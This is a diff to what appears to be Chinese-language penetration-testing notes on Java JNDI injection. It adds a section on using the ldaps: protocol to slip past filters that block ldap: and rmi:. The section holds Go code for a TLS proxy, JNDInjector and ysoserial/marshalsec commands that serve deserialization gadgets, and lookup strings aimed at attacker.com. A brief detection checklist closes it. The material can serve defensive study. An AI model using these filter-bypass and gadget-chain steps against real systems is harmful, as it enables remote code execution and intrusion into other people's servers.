@@ -263,3 +263,78 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit"
 # Post-8u191 — ysoserial JRMP:
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
 ```
+
+---
+
+## 9. LDAPS (LDAP over SSL/TLS) 利用 (from leavesongs.com)
+
+> 当 `ldap:` 和 `rmi:` 关键字被拦截时，可使用 `ldaps:` 协议绕过 [1]
+
+### 9.1 LDAPS 原理
+
+- **LDAPS**: LDAP over SSL/TLS，与 HTTPS 类似，全程加密通信
+- **Opportunistic TLS**: STARTTLS 升级，先明文后加密
+- Java 支持: `com.sun.jndi.url.ldaps.ldapsURLContextFactory`
+
+**协议格式**:
+```
+ldaps://attacker.com:636/cn=Exploit
+```
+
+### 9.2 TLS 反向代理方案
+
+无需自己编写 LDAPS 服务器，使用 TLS 代理转发到普通 LDAP 服务：
+
+```go
+// tls_proxy 核心逻辑
+cert, _ := tls.LoadX509KeyPair(certPath, keyPath)
+config := &tls.Config{Certificates: []tls.Certificate{cert}}
+listener, _ := tls.Listen("tcp", localAddr, config)
+
+for {
+    conn, _ := listener.Accept()
+    go handleConnection(conn, remoteAddr)
+}
+
+func handleConnection(src net.Conn, remoteAddr string) {
+    dest, _ := net.Dial("tcp", remoteAddr)
+    go io.Copy(dest, src)
+    io.Copy(src, dest)
+}
+```
+
+**使用流程**:
+```bash
+# 1. 启动普通 LDAP 利用服务（如 JNDInjector）
+java -jar JNDInjector.jar -l 1389 -p CommonsBeanutils1 -c "calc.exe"
+
+# 2. 启动 TLS 代理
+./tls_proxy -l 0.0.0.0:1636 -r 127.0.0.1:1389 -c cert.pem -k key.pem
+
+# 3. 目标触发 JNDI 注入
+ctx.lookup("ldaps://attacker.com:1636/xxx/CommonsBeanutils1/Exec/...")
+```
+
+### 9.3 证书获取
+
+LDAPS 需要合法 TLS 证书，可使用：
+- Let's Encrypt / Certbot
+- ssl-for-free 等在线服务
+- 自签名证书（需目标信任）
+
+### 9.4 检测建议
+
+```
+网络侧:
+- 监控 636 端口连接
+- 分析 TLS SNI 中的可疑域名
+
+应用侧:
+- 拦截 InitialContext.lookup() 调用
+- 限制 JNDI 协议白名单（禁用 ldaps/ldap/rmi）
+```
+
+## 参考
+
+[1] Phith0n. "如何巧妙构建"LDAPS"服务器利用JNDI注入". leavesongs.com. 2024-08-16.
+    https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html
